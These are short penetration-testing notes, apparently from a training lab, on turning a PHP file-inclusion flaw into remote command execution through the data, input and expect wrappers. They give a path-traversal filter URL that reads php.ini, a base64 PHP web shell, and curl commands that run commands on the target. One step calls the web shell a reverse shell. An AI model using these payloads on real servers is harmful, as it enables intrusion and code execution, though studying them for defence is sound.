
### DATA WRAPPER

Data wrapper can be used to get external data or PHP code, but can only be used if (allow_url_include) setting is enabled in PHP config. which can be checked in the php configuration file. (x.y is the version).

Apache = /etc/php/X.Y/apache2/php.ini
Nginx = /etc/php/X.Y/fpm/php.ini

1. Will need to use the base64 url encode filter as ini files could also break with output. payload starts at php://filter

`/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini`

2. On local machine, create a base64 encoded php reverse shell that can be copied and pasted as the LFI payload

```CLI
echo '<?php system($_GET["cmd"]); ?>' | base64
```


 3. Then url encode that b64 payload and enter in data wrapper LFI and add ?cmd=<Command injection>

`data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id`

*Data wrapper can also be used in a cURL command*

```CLI
curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
```

### Input Wrapper

Same requirements and step as the Data wrapper, except the input wrapper relies on a POST request.

```cli
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
```

 If it only accepts posts requests, the payload can be a command directly in php code

```php
<\?php system('id')?>
```

### Expect Wrapper

Allows for command to get inputted directly in URL stream. The 'parameter=expect' need to be set in the php configuration.

To excute, add the command at the end.
```cli
curl -s "http://SERVER_IP:PORT/index.php?language=expect://id"
```

